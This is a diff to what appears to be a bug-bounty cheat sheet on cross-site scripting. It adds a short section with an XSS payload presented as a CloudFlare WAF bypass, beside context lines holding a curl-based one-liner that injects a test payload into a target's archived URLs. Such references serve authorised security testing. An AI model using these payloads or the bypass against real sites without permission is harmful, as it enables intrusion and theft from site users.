@@ -921,6 +921,13 @@ echo "target.com" | waybackurls | grep "?" | qsreplace 'xssz"><img/src=x onerror
 echo "target.com" | waybackurls | grep "?" | qsreplace 'xssz"><img/src=x onerror=confirm(999)><!--' | while read url; do curl -s "$url" | awk '/"><img\//' && echo "Potential XSS at: $url"; done
 ```
 
+### CloudFlare XSS Bypass
+It's better than our previous `<Img Src=OnXSS OnError=alert(1)>` because it works where no spaces are allowed.
+```html
+OnXSS=<Img/Src/OnError=alert(1)>
+```
+![xss-cf](https://github.com/user-attachments/assets/4af225c3-2180-4f4b-bb2b-32a7bc715fad)
+
 
 ## Automate XSS
 * [dalfox](https://github.com/hahwul/dalfox) - DalFox is a powerful open-source tool that focuses on automation, making it ideal for quickly scanning for XSS flaws and analyzing parameters
